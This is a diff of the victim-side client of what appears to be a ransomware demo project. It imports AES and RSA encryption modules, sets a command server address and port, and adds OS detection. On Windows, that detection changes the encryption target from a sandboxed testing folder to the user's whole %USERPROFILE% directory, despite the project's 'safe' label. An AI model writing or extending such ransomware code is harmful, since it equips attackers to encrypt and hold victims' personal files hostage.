@@ -1,13 +1,24 @@
 import socket, json, os, struct, uuid, base64
 import AesAlgorithm
 import RSA_algorithm
-
+from platform import sys
 
 #setup configure for victim
 SERVER_IP = "192.168.56.1"
 SERVER_PORT = 6967
-TARGET_DIR = "/home/k4k/vscode/safe-ransomware-crypto-demo/src/testing_env"
+TARGET_DIR = "/home/k4k/vscode/safe-ransomware-crypto-demo/src/testing_env" #testing purpose
 CLIENT_ID_FILE = ".client_uuid"
+
+#checking type os for path handling using sys.platform
+platform = sys.platform
+if platform.startswith("win"):
+    TARGET_DIR = "%USERPROFILE%"
+elif platform.startswith("linux"):
+    pass #linux we can change when we use in the future since this is demo only in windows
+elif platform == "darwin":
+    pass #same as this
+else:
+    print("Unknown platform:", platform)
 
 #generate/get uuid
 def get_or_create_uuid():
